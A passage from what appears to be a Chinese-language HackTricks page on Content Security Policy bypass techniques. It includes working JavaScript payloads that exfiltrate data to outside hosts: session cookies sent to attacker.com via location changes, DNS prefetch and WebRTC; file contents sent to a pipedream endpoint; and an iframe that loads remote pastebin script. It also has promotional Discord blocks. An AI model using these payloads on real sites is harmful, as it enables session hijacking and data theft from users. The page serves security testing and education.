'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### 使用 Content-Security-Policy-Report-Only 进行 JS 数据泄露

如果你能够让服务器响应头部 **`Content-Security-Policy-Report-Only`** 并且**值由你控制**（可能是因为 CRLF），你可以让它指向你的服务器，如果你**用** **`<script>`** **包裹**你想要泄露的**JS内容**，并且因为高度可能 `unsafe-inline` 不被 CSP 允许，这将**触发 CSP 错误**，并且包含敏感信息的脚本的一部分将从 `Content-Security-Policy-Report-Only` 发送到服务器。

例如，[**查看这个 CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)。

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### 使用CSP和Iframe泄露信息

* 创建一个指向URL的`iframe`（我们称之为`https://example.redirect.com`），该URL在CSP中被允许。
* 然后，该URL重定向到一个未被CSP允许的秘密URL（例如`https://usersecret.example2.com`）。
* 通过监听`securitypolicyviolation`事件，可以捕获`blockedURI`属性。该属性会显示被阻止的URI的域，从而泄露初始URL重定向到的秘密域。

有趣的是，像Chrome和Firefox这样的浏览器在处理与CSP相关的iframes时有不同的行为，可能会由于未定义的行为导致敏感信息泄露。

另一种技术涉及利用CSP本身来推断秘密子域。这种方法依赖于二分搜索算法，并调整CSP以包含特定被故意阻止的域。例如，如果秘密子域由未知字符组成，您可以通过修改CSP指令来阻止或允许这些子域，迭代地测试不同的子域。以下是一个显示如何设置CSP以便实现此方法的代码片段：
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
通过监视 CSP 阻止或允许的请求，可以缩小秘密子域中可能的字符范围，最终揭示完整的 URL。

这两种方法利用了 CSP 在浏览器中的实现和行为细微差别，展示了看似安全的策略如何无意中泄露敏感信息。

技巧来自[**这里**](https://ctftime.org/writeup/29310)。

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 服务器，与经验丰富的黑客和赏金猎人交流！

**黑客见解**\
参与深入探讨黑客的刺激和挑战的内容

**实时黑客新闻**\
通过实时新闻和见解，跟上快节奏的黑客世界

**最新公告**\
了解最新的赏金任务发布和重要平台更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，立即与顶尖黑客合作！

## 绕过 CSP 的不安全技术

### PHP 响应缓冲区超载

PHP 默认会将响应缓冲到 4096 字节。因此，如果 PHP 显示警告，通过在警告中提供足够的数据，响应将在 CSP 头之前发送，导致头部被忽略。\
然后，该技术基本上是通过**填充响应缓冲区以显示警告**，从而不发送 CSP 头。

灵感来自[**这篇文章**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)。

### 重写错误页面

根据[**这篇文章**](https://blog.ssrf.kr/69)，似乎可以通过加载错误页面（可能没有 CSP）并重写其内容来绕过 CSP 保护。
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME是一种技术，利用页面端点中的XSS（或高度受限的XSS）来滥用同一源的其他端点。这是通过从攻击者页面加载易受攻击的端点，然后刷新攻击者页面到您想要滥用的同一源中的真实端点来完成的。这样易受攻击的端点可以使用`opener`对象在**有效负载**中访问要滥用的**真实端点的DOM**。有关更多信息，请查看：

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

此外，**wordpress**在`/wp-json/wp/v2/users/1?_jsonp=data`中有一个**JSONP**端点，将在输出中**反射**发送的**数据**（仅限字母、数字和点）。

攻击者可以滥用该端点对WordPress执行**生成SOME攻击**，并将其嵌入到`<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`中，请注意，此**脚本**将被**加载**，因为它被'自身'允许。此外，由于WordPress已安装，攻击者可能会通过**绕过CSP**的**易受攻击的回调**端点滥用**SOME攻击**，以赋予用户更多权限，安装新插件...\
有关如何执行此攻击的更多信息，请查看[https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP数据泄漏绕过

如果存在严格的CSP不允许您与外部服务器**交互**，则有一些事情您始终可以做来泄露信息。

### Location

您可以简单地更新位置以将秘密信息发送到攻击者的服务器：
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta标签

您可以通过注入一个meta标签来进行重定向（这只是一个重定向，不会泄露内容）
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

为了加快页面加载速度，浏览器会预先将主机名解析为 IP 地址并缓存以备后用。\
您可以通过以下方式指示浏览器预先解析主机名：`<link rel="dns-prefetch" href="something.com">`

您可以利用这种行为来通过 DNS 请求**泄露敏感信息**：
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
另一种方法：
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
为了避免这种情况发生，服务器可以发送以下HTTP标头：
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
显然，这种技术在无头浏览器（机器人）中不起作用
{% endhint %}

### WebRTC

在一些页面上，您可以看到**WebRTC不检查CSP的`connect-src`策略**。

实际上，您可以使用_DNS请求_来_泄漏_信息。查看以下代码：
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
另一个选项：
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## 在线检查CSP策略

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## 自动创建CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## 参考资料

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和赏金猎人交流！

**黑客见解**\
参与深入探讨黑客行为的刺激和挑战

**实时黑客新闻**\
通过实时新闻和见解及时了解快节奏的黑客世界

**最新公告**\
随时了解最新的赏金任务发布和重要平台更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，立即与顶尖黑客合作！

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
